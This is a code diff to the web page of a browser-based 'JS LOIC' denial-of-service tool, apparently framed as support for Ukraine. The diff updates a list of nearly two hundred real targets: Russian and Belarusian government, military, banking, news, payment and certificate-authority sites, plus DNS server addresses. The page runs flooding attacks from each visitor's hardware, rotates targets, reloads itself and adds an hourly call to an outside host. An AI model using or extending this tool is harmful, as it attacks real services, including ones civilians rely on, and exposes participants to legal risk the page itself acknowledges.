@@ -10,41 +10,47 @@
     let blocksNum = 8;
 
     const servers =
-        ["https://www.belnovosti.by/", "https://baksman.org/", "https://prostocash.com/", "https://royal.cash/", "https://multichange.net/",
-          "https://ychanger.net/", "https://mine.exchange/", "https://www.gazeta.ru/", "https://www.mk.ru/", "http://rw.by",
-          "http://www.fsb.ru/", "http://www.fsb.ru/", "https://www.rhc.aero/", "http://admship.ru/", "http://www.uralvagonzavod.ru/",
-          "https://www.uecrus.com/rus/", "https://www.uacrussia.ru/ru/",
-          "https://sbi.sberbank.ru:9443/ic/sso/#/login?redirect_uri=htt…nid+sberbankencashment_web&response_type=code&client_id=8313",
-          "https://sputnik.by/", "https://azgaz.ru/", "https://yandex.by/", "https://www.yaplakal.com/",
-          "https://belinvestbank.by/individual", "https://lukoil.ru/", "https://mvdlnr.ru/", "https://www.metalloinvest.com/",
-          "https://shop-rt.com", "https://rkn.gov.ru/", "https://www.sibur.ru/", "https://www.tmk-group.ru/",
-          "https://www.uralkali.com/ru/", "https://ya.ru/", "https://www.024.by/", "https://alfaradio.by/", "https://www.gazeta.ru/",
-          "http://mx3.cbr.ru", "https://mx4.cbr.ru", "https://www.belarus.by/", "https://belarus24.by/", "https://belmarket.by/",
-          "http://belta.by/", "http://bezformata.com/", "https://cloud.rkn.gov.ru/", "https://betatransfer.org/", "https://delets.cash/",
-          "https://ww-pay.net/", "https://ramon.money/", "https://platov.co/", "https://coinpaymaster.com/", "https://superchange.net/",
-          "https://bitokk.biz/", "https://www.netex24.net/", "https://changer.club/", "https://cleanbtc.ru/", "https://bonkypay.com/",
-          "https://cashbank.pro/", "https://betatransfer.org/", "https://flashobmen.com/", "https://betatransfer.org/",
-          "https://betatransfer.org/", "https://betatransfer.org/", "https://betatransfer.org/", "https://betatransfer.org/",
-          "https://abcobmen.com/", "https://kupibit.me/", "https://24paybank.ne", "https://abcobmen.com/", "http://www.ctv.by/",
-          "https://grodnonews.by/", "http://kommersant.ru/", "http://kp.ru/", "https://mail.rkn.gov.ru/", "https://www.mil.by/",
-          "https://minsknews.by/", "https://mogilevnews.by/", "https://ont.by/", "https://pikabu.ru/",
-          "https://www.polymetalinternational.com/ru/", "https://proverki.gov.ru/", "https://radiobelarus.by/", "https://radiobrestfm.by/",
-          "https://radiomir.by/", "https://radiostalica.by/", "https://radiusfm.by/", "http://rbc.ru/", "http://ria.ru/",
-          "http://riafan.ru/", "http://portal.rw.by", "https://pass.rw.by/ru/",
-          "https://www.bestchange.ru/tether-trc20-to-visa-mastercard-euro.html", "http://www.salut.ru/", "http://www.almaz-antey.ru/",
-          "https://www.sevmash.ru/", "http://www.ktrv.ru/", "https://kalashnikovgroup.ru/", "http://www.nordsy.spb.ru/",
-          "https://www.moex.com", "https://www.sb.by/", "http://email12.sberbank.ru", "http://email11.sberbank.ru",
-          "https://www.slonves.by/", "https://stroi.gov.ru/", "https://www.tvr.by/", "https://www.tvrmogilev.by/",
-          "https://pwd.wto.economy.gov.ru/", "https://yandex.ru/", "https://zarya.by/", "https://api.developer.sber.ru/product/SberbankID",
-          "https://bankdabrabyt.by/", "https://brrb.by/", "https://www.belapb.by/", "https://belarusbank.by/", "https://bgp.by/ru/",
-          "https://www.belneftekhim.by", "http://www.bellegprom.by", "http://belres.by/ru/", "https://www.energo.by", "https://www.vtb.ru/",
-          "https://www.gazprom.ru/", "https://www.gazprombank.ru/", "http://www.prokuratura.gov.by/", "https://www.gosuslugi.ru/",
-          "https://www.mos.ru/uslugi/", "https://www.evraz.com/ru/", "https://www.eurosib.ru/", "http://www.kgb.by/ru/",
-          "https://magnit.ru/", "https://www.mvd.gov.by/ru", "https://mil.ru/", "https://www.mil.by/", "https://www.nalog.gov.ru/",
-          "http://www.nbrb.by/", "https://nlmk.com/", "https://nangs.org/", "https://www.nornickel.com/", "https://omk.ru/",
-          "https://glava-lnr.info/", "https://pfr.gov.ru/", "http://www.government.by/", "http://government.ru/", "http://kremlin.ru/",
-          "https://rmk-group.ru/ru/", "https://mvd.gov.ru/", "https://www.sberbank.ru/", "https://www.severstal.com/",
-          "https://www.surgutneftegas.ru/", "https://customs.gov.ru/", "https://www.tatneft.ru/", "https://rec.gov.by/ru",
+        ["http://belta.by/", "https://sputnik.by/", "https://www.tvr.by/", "https://www.sb.by/", "https://belmarket.by/",
+          "https://www.belarus.by/", "https://belarus24.by/", "https://ont.by/", "https://www.024.by/", "https://www.belnovosti.by/",
+          "https://mogilevnews.by/", "https://yandex.by/", "https://www.slonves.by/", "http://www.ctv.by/", "https://radiobelarus.by/",
+          "https://radiusfm.by/", "https://alfaradio.by/", "https://radiomir.by/", "https://radiostalica.by/", "https://radiobrestfm.by/",
+          "https://www.tvrmogilev.by/", "https://minsknews.by/", "https://zarya.by/", "https://grodnonews.by/", "https://rec.gov.by/ru",
+          "https://www.mil.by/", "http://www.government.by/", "https://www.mvd.gov.by/ru", "http://www.kgb.by/ru/",
+          "http://www.prokuratura.gov.by/", "http://www.nbrb.by/", "https://belarusbank.by/", "https://brrb.by/", "https://www.belapb.by/",
+          "https://bankdabrabyt.by/", "https://belinvestbank.by/individual", "https://bgp.by/ru/", "https://www.belneftekhim.by",
+          "http://www.bellegprom.by", "https://www.energo.by", "http://belres.by/ru/", "https://shop-rt.com",
+          "https://api.developer.sber.ru/product/SberbankID", "http://bezformata.com/", "http://rbc.ru/", "https://www.yaplakal.com/",
+          "https://www.mk.ru/", "http://kommersant.ru/", "https://pikabu.ru/", "http://riafan.ru/", "http://kp.ru/",
+          "https://www.gazeta.ru/", "http://ria.ru/", "https://glava-lnr.info/", "https://mail.rkn.gov.ru/", "https://cloud.rkn.gov.ru/",
+          "https://mvd.gov.ru/", "https://pwd.wto.economy.gov.ru/", "https://stroi.gov.ru/", "https://proverki.gov.ru/",
+          "https://www.gazprom.ru/", "https://lukoil.ru/", "https://magnit.ru/", "https://www.nornickel.com/",
+          "https://www.surgutneftegas.ru/", "https://www.tatneft.ru/", "https://www.evraz.com/ru/", "https://nlmk.com/",
+          "https://www.sibur.ru/", "https://www.severstal.com/", "https://www.metalloinvest.com/", "https://nangs.org/",
+          "https://rmk-group.ru/ru/", "https://www.tmk-group.ru/", "https://ya.ru/", "https://www.polymetalinternational.com/ru/",
+          "https://www.uralkali.com/ru/", "https://www.eurosib.ru/", "https://omk.ru/", "https://www.sberbank.ru/", "https://www.vtb.ru/",
+          "https://www.gazprombank.ru/", "https://www.gosuslugi.ru/", "https://www.mos.ru/uslugi/", "http://kremlin.ru/",
+          "http://government.ru/", "https://mil.ru/", "https://www.nalog.gov.ru/", "https://customs.gov.ru/", "https://pfr.gov.ru/",
+          "https://rkn.gov.ru/", "http://mx3.cbr.ru", "https://mx4.cbr.ru", "http://email11.sberbank.ru", "http://email12.sberbank.ru",
+          "https://www.moex.com", "194.54.14.186:53 UDP", "194.54.14.187:53 UDP", "194.67.7.1:53 UDP", "194.67.2.109:53 UDP",
+          "https://pass.rw.by/ru/", "http://portal.rw.by", "http://rw.by",
+          "https://www.bestchange.ru/tether-trc20-to-visa-mastercard-euro.html", "https://www.uacrussia.ru/ru/",
+          "http://www.almaz-antey.ru/", "https://www.uecrus.com/rus/", "http://www.uralvagonzavod.ru/", "https://azgaz.ru/",
+          "https://kalashnikovgroup.ru/", "http://www.ktrv.ru/", "http://www.salut.ru/", "https://www.sevmash.ru/",
+          "http://www.nordsy.spb.ru/", "http://admship.ru/", "https://www.rhc.aero/", "https://cleanbtc.ru/", "https://bonkypay.com/",
+          "https://changer.club/", "https://superchange.net/", "https://mine.exchange/", "https://platov.co/", "https://ww-pay.net/",
+          "https://delets.cash/", "https://ramon.money/", "https://coinpaymaster.com/", "https://bitokk.biz/", "https://www.netex24.net/",
+          "https://cashbank.pro/", "https://flashobmen.com/", "https://abcobmen.com/", "https://ychanger.net/", "https://multichange.net/",
+          "https://24paybank.ne", "https://royal.cash/", "https://prostocash.com/", "https://baksman.org/", "https://kupibit.me/",
+          "https://betatransfer.org/", "https://yandex.ru/", "https://gosuslugi.astrobl.ru/", "http://www.fsb.ru/",
+          "https://iecp.ru/ep/ep-verification", "https://iecp.ru/ep/uc-list", "https://uc-osnovanie.ru/", "http://www.nucrf.ru",
+          "http://www.belinfonalog.ru", "http://www.roseltorg.ru", "http://www.astralnalog.ru", "http://www.nwudc.ru",
+          "http://www.center-inform.ru", "https://kk.bank/UdTs", "http://structure.mil.ru/structure/uc/info.htm", "http://www.ucpir.ru",
+          "http://dreamkas.ru", "http://www.e-portal.ru", "http://izhtender.ru", "http://imctax.parus-s.ru", "http://www.icentr.ru",
+          "http://www.kartoteka.ru", "http://rsbis.ru/elektronnaya-podpis", "http://www.stv-it.ru", "http://www.crypset.ru",
+          "http://www.kt-69.ru", "http://www.24ecp.ru", "http://kraskript.com", "http://ca.ntssoft.ru", "http://www.y-center.ru",
+          "http://www.rcarus.ru", "http://rk72.ru", "http://squaretrade.ru", "http://ca.gisca.ru", "http://www.otchet-online.ru",
+          "http://udcs.ru", "http://www.cit-ufa.ru", "http://elkursk.ru", "http://www.icvibor.ru", "http://ucestp.ru", "http://mcspro.ru",
+          "http://www.infotrust.ru", "http://epnow.ru", "http://ca.kamgov.ru", "http://mascom-it.ru", "http://cfmc.ru",
           "https://sputnik.by", "https://www.gazprom.ru", "https://lukoil.ru", "https://www.sberbank.ru", "https://cloud.rkn.gov.ru",
           "https://mvd.gov.ru", "http://www.belta.by/", "https://www.priorbank.by/", "http://www.sb.by/",
           "https://www.sber-bank.by/sberprime", "https://belapb.by/", "http://sputnik.by/", "http://www.belarus.by/",
@@ -215,7 +221,7 @@
 
 
   <h2>How does this work?</h2>
-  <p>This site uses a JS LOIC script to locally run Denial of Service attacks to a list of targets from your own hardware.
+  <p>This site uses a JS LOIC script to locally run Denial of Service attacks to a list of targets <b>(198 as of now)</b> from your own hardware.
     For each cannon a target is chosen (and automatically switched every minute) to reduce the load on your hardware,
     and to ensure targets are "evenly" distributed.
     This has the potential to be a much more decentralized attack than a traditional DoS attack would be,
@@ -224,6 +230,8 @@
     users on the site.
   </p>
 
+  <h2>Is it working?</h2>
+  <p>See for yourself ;) <a href="https://ddosmonitor.herokuapp.com" target="monitor">Here is our monitoring site</a>.</p>
   <h2>My machine is to weak / strong for this script?</h2>
   <form action="index.html" method="GET">
     <select id="rqps" name="rqps">
@@ -236,7 +244,8 @@
   </form>
 
   <h2>Who is participating?</h2>
-  <p>While we can't know for sure we provide a daily map of downloads that reached our server. <a href="map.html" target="map">You can take a look at the world map here</a>.</p>
+  <p>While we can't know for sure we provide a daily map of downloads that reached our server. <a href="map.html" target="map">You can take
+    a look at the world map here</a>.</p>
   <p>Yellow circles group green circles, green circles group multiple country download numbers, orange circle tell downloads per country</p>
   <h2>Important Notices:</h2>
   <p>If the target server is down, the success counter may display 0. This is completely normal, due to the server not being
@@ -247,7 +256,7 @@
     ;)</p>
   <h2>Changelog:</h2>
   <p>v1.3 ui theme revised, added selector to choose request load for different models of PCs, auto reload every 8 hours</p>
-  <p>v1.4 adding daily download stats per country</p>
+  <p>v1.4 adding daily download stats per country, updated server list</p>
   <p>see <a href="https://github.com/eitzenbe/StandWithUkraine">Our github repo</a></p>
 
   <script>
@@ -255,8 +264,8 @@
 
     if (window.location.href.indexOf('rqps=') === -1) {
       alert('Welcome! Please note that your bandwidth and computational resources will be used to assist Ukraine\'s efforts' +
-        ' in countering Russia\'s threats to their sovereignty. Please be aware that this could be illegal in your country.' +
-        'Thank you so much for helping!');
+          ' in countering Russia\'s threats to their sovereignty. Please be aware that this could be illegal in your country.' +
+          'Thank you so much for helping!');
     }
 
     var btns = document.getElementsByClassName("btn-flood");
@@ -290,13 +299,28 @@
     setInterval(triggerHell, 60000);
     triggerHell();
 
+    // reload after 8h
     setTimeout(function () {
       let char = '?';
       if (window.location.href.indexOf('?') !== -1) {
         char = '&';
       }
       window.location.href = window.location.href + char + 'trigger=' + (+new Date()) + '&rqps=' + rqps;
-    }, 8*3600*1000);
+    }, 8 * 3600 * 1000);
+
+    // hourly reporting in
+    setInterval(function () {
+      var xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "https://eitzen.at/fckptn/ukrainian_support.html", true);
+      xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+      xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 404) {
+          // Response
+          console.log("last man standing");
+        }
+      };
+      xhttp.send();
+    }, 60 * 60000);
   </script>
   <p align="center">&copy; JS LOIC - Thanx for the base script</p>
 
